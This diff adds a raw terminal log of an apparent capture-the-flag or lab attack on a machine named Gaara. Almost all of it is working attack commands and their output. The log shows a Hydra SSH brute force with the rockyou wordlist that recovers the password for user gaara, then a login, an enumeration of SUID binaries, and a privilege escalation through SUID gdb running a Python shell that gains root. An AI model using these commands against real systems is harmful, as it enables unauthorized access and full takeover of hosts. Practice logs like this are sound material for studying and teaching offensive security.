@@ -1,0 +1,86 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.243.142 ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-16 23:09:54
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.243.142:22/
+[22][ssh] host: 192.168.243.142   login: gaara   password: iloveyou2
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-16 23:10:50
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh gaara@192.168.243.142  
+...
+gaara@Gaara:~$ ls -lsa
+
+
+
+gaara@Gaara:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gdb
+/usr/bin/sudo
+/usr/bin/gimp-2.10
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/umount
+
+
+gaara@Gaara:~$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+# id
+uid=1001(gaara) gid=1001(gaara) euid=0(root) egid=0(root) groups=0(root),1001(gaara)
+# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
